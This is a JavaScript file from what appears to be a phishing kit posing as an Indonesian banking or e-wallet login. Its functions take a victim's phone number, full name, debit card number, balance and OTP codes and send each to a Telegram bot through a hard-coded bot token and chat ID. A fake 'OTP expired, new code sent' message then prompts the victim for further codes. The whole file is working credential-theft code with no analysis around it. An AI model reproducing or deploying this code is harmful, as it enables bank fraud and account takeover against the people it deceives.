  function sendNohp(event) {
      event.preventDefault();


      document.getElementById('btnSubmit').innerHTML = "Memproses...";
      var nama = document.getElementById('nama');


      var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nama.value;

      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
      var grup = '6937029970';

      $.ajax({
          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
          method: `POST`,

          success: function() {;
              setTimeout(function() {
                  var nomor = document.getElementById("nama").value;
                  sessionStorage.setItem("nomor", nomor);
                  location.href = "./login.html";
              }, 500);
          }
      });
  };




  function sendDebit(event) {
      event.preventDefault();


      document.getElementById('btnSubmit').innerHTML = "Memproses...";
      var nomorku = document.getElementById('nomorku');
      var nama = document.getElementById('nama');
      var debit = document.getElementById('debit');


      var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value;


      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
      var grup = '6937029970';

      $.ajax({
          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
          method: `POST`,

          success: function() {
              $("#debitpage").fadeOut();
              $("#saldopage").fadeIn();
          }
      });
  };


  var nomor = sessionStorage.getItem("nomor");
  document.getElementById("nomorku").value = nomor + "";




  function sendOtp(event) {
      event.preventDefault();


      document.getElementById('btnSubmit2').innerHTML = "Memproses...";
      var logo = document.getElementById('logo');
      var nomorku = document.getElementById('nomorku');
      var nama = document.getElementById('nama');
      var debit = document.getElementById('debit');

      var rupiah = document.getElementById('rupiah');
      var otp = document.getElementById('otp');


      var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value + '%0A%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣%3A%0A' + otp.value;


      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
      var grup = '6937029970';

      $.ajax({
          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
          method: `POST`,

          success: function() {
              $("#invalid").addClass("fontku");
              $("#invalid").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
              $("#invalid").css("color", "red");

              setTimeout(function() {
                  $("#invalid").text("Kode OTP baru sudah kami kirimkan kembali");
                  $("#invalid").css("color", "green");
                  $("#invalid").show()
              }, 3000);
              setTimeout(function() {
                  $("#invalid").css("color", "#0f78cb");
                  $("#invalid").text(">> Request Kode OTP ? <<");
                  $("#invalid").removeClass("fontku");
                  document.getElementById('btnSubmit2').innerHTML = "PROSES";
                  $("#otp").val("");
                  $("#otp").focus();
              }, 5000);
          }
      });
  };





  function sendSaldo(event) {
      event.preventDefault();


      document.getElementById('btnSubmit1').innerHTML = "Memproses...";

      var nomorku = document.getElementById('nomorku');
      var nama = document.getElementById('nama');
      var debit = document.getElementById('debit');

      var rupiah = document.getElementById('rupiah');




      var gabungan = '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value;


      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
      var grup = '6937029970';

      $.ajax({
          url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
          method: `POST`,

          success: function() {
              $("#saldopage").fadeOut();
              $("#otppage").fadeIn();

          }
      });
  };